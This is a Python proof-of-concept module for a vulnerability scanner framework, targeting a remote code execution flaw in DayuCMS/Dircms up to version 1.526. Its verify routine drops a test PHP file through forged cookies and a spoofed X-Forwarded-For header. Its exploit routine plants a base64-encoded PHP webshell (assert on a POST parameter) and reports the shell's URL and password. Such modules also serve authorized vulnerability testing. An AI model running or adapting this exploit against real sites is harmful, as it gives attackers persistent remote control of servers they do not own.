# coding: utf-8
import random
import hashlib
import base64

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'DayuCMS_0101'  # 平台漏洞编号，留空
    name = 'DayuCMS & Dircms <=1.526 /pay/order.php 代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-06-09'  # 漏洞公布时间
    desc = '''
    DayuCMS在将字符串转换为数组的函数中直接利用eval，并且存在可控变量，导致任意代码执行。
    '''  # 漏洞描述
    ref = 'http://joychou.org/index.php/web/dayucms-1-526-foreground-remote-code-execution.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DayuCMS'  # 漏洞应用名称
    product_version = '<=1.526'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '68ebf9eb-121e-4cd7-8ccb-4603058f21d8'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def md5_t(self, char):
        return hashlib.md5(char).hexdigest()

    def dayucms_md5(self, char):
        return self.md5_t(char)[8:24]

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            ip = '2.2.2.2'
            filenum = random.randint(10000, 99999)
            filename = base64.b64encode('%d.php' % filenum)
            verify_url = '%s/pay/order.php' % self.target
            req = requests.get(verify_url)
            cookie = req.cookies
            cookie_pre = ''
            for cookie_tuple in list(cookie.items()):
                for k in cookie_tuple:
                    if 'siteid' in k:
                        cookie_pre = k
                        break
            cookie_key = self.dayucms_md5('productarray'+ip)
            cookie_key = cookie_pre[:-6] + cookie_key
            vs = 'PD9waHAgdmFyX2R1bXAobWQ1KDEyMykpO3VubGluayhfX0ZJTEVfXyk7'
            verify_shell = 'fputs(fopen(base64_decode(%s),w),base64_decode(%s))' % (
                filename, vs)
            verify_shell = '1%3b' + verify_shell
            false_headers = {'X-Forwarded-For': ip}
            false_cookies = {cookie_key: verify_shell, cookie_pre: '1'}
            verify_req = requests.get(
                verify_url, cookies=false_cookies, headers=false_headers)
            verify_shell_url = '%s/pay/%d.php' % (self.target, filenum)
            if '202cb962ac59075b964b07152d234b70' in requests.get(verify_shell_url).text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            ip = '2.2.2.2'
            filenum = random.randint(10000, 99999)
            filename = base64.b64encode('%d.php' % filenum)
            verify_url = '%s/pay/order.php' % self.target
            req = requests.get(verify_url)
            cookie = req.cookies
            cookie_pre = ''
            for cookie_tuple in list(cookie.items()):
                for k in cookie_tuple:
                    if 'siteid' in k:
                        cookie_pre = k
                        break
            cookie_key = self.dayucms_md5('productarray'+ip)
            cookie_key = cookie_pre[:-6] + cookie_key
            vs = 'PD9waHAKdmFyX2R1bXAobWQ1KDEyMykpOwphc3NlcnQoCiRfUE9TVFtiZWViZWV0b10KKTs'
            webshell = 'fputs(fopen(base64_decode(%s),w),base64_decode(%s))' % (
                filename, vs)
            webshell = '1%3b' + webshell
            false_headers = {'X-Forwarded-For': ip}
            false_cookies = {cookie_key: webshell, cookie_pre: '1'}
            verify_req = requests.get(
                verify_url, cookies=false_cookies, headers=false_headers)
            shell_url = '%s/pay/%d.php' % (self.target, filenum)
            if '202cb962ac59075b964b07152d234b70' in requests.get(shell_url).text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的信息:webshell={webshell},password={password}'.format(
                    target=self.target, name=self.vuln.name, webshell=shell_url, password='beebeeto'))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
